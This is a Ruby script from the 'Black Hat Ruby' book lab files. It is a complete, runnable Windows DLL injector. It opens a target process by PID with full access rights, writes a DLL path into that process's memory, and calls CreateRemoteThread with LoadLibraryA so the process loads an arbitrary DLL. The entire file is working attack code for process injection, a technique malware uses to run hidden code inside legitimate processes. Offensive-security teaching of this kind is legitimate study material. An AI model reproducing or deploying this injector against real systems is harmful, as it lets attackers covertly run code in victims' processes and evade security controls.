#!/usr/bin/env ruby
# ========================================================= #
# This file is a part of { Black Hat Ruby } book lab files. #
# ========================================================= #
#
# Author:
#   Sabri Hassanyah | @KINGSABRI
# Description:
#   DLL injector script uses CreateRemoteThread technique (shorter version)
#   Make sure that your payload (dll) architecture matches Ruby architecture
#   - eg. If your Ruby architecture is x64, the payload must be x64 too
# Requirements:
#   Windows OS
# 
unless Gem.win_platform?
  puts "[!] This script runs only on Windows OS!"
  exit!
end
  
require 'fiddle'
require 'fiddle/import'
require 'fiddle/types'
require 'optionparser'

options = {}
option = OptionParser.new
option.banner = "DLL Injector – Ruby Script to inject a dll into process.\n\n"
option.on('-p', '--process-id [PID]',   'Process ID (PID)') {|v| options[:pid] = v || ''}
option.on('-d', '--dll [FILE]',  'dll file to inject')      {|v| options[:dll] = v || ''}
option.on_tail  "Usage: dllinjection.rb -p PID -d file.dll"
option.parse! ARGV

if options[:pid].nil? || options[:dll].nil?
  puts option
  exit!
end

pid = options[:pid].to_i
dll = File.absolute_path(options[:dll])

PAGE_READWRITE     = 0x04
PROCESS_ALL_ACCESS = ( 0x00F0000 | 0x00100000 | 0xFFF )
VIRTUAL_MEM        = ( 0x1000 | 0x2000 )
MEM_RELEASE        = 0x8000

include Fiddle

# The handler in x64 is longer so we had to change its time to TYPE_LONG_LONG
if RUBY_PLATFORM.include?("x64")
  puts "[+] Ruby architecture is: x64"
  @arch_int = Fiddle::TYPE_LONG_LONG # 6
elsif RUBY_PLATFORM.include?("i386")
  puts "[+] Ruby architecture is: x86"
  @arch_int = Fiddle::TYPE_INT       # 4
else
  puts "[!] Unknown architecture."
  puts RUBY_PLATFORM
end

kernel32 = Fiddle.dlopen('kernel32')

puts "[+] OpenProcess - PID: #{pid}"
open_process = Function.new(kernel32['OpenProcess'], [1, 0, 1], 1)
hprocess     = open_process.call(PROCESS_ALL_ACCESS, false, pid)

puts "[+] VirtualAllocEx - #{dll.size}-bytes"
arg_address = Function.new(kernel32['VirtualAllocEx'], [4, 1, 1, 1, 1], 1)
hdllpath = arg_address.call(hprocess, 0, dll.size, VIRTUAL_MEM, PAGE_READWRITE) 

puts "[+] WriteProcessMemory"
write_process_memory = Function.new(kernel32['WriteProcessMemory'], [4, 1, 1, 1, 1], 1)
write_process_memory.call(hprocess, hdllpath, dll, dll.size, 0)

puts "[+] LoadLibraryA"
h_kernel32 = Function.new(kernel32['GetModuleHandleA'], [TYPE_VOIDP], TYPE_VOIDP).call('kernel32.dll')
h_loadlibrarya = Function.new(kernel32['GetProcAddress'], [@arch_int, 1], 1).call(h_kernel32, 'LoadLibraryA')

puts "[+] CreateRemoteThread"
create_remote_thread = Function.new(kernel32['CreateRemoteThread'], [@arch_int, 1, 1, @arch_int, @arch_int, 1, 1], 1)
thread = create_remote_thread.call(hprocess, 0, 0, h_loadlibrarya.to_i, hdllpath, 0, 0)

puts "[+] WaitForSingleObject"
Function.new(kernel32['WaitForSingleObject'], [4, 4], 4).call(thread, -1)

puts "[+] VirtualFreeEx"
virtual_free_ex = Function.new(kernel32['VirtualFreeEx'], [@arch_int, @arch_int, @arch_int, @arch_int], 4)
virtual_free_ex.call(hprocess, hdllpath, hdllpath, MEM_RELEASE)

puts "[+] CloseHandle"
Function.new(kernel32['CloseHandle'], [@arch_int], 4).call(hprocess)
